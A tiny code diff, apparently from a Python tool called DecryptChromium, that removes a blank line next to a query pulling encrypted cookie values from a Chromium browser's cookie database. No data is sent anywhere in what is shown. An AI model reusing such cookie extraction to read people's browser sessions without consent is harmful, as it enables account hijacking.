@@ -41,7 +41,6 @@ class DecryptChromium():
         conn = sqlite3.connect(cookies_path)
         cursor = conn.cursor()
         cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
-        
         results_array = []
         
         # Get the results
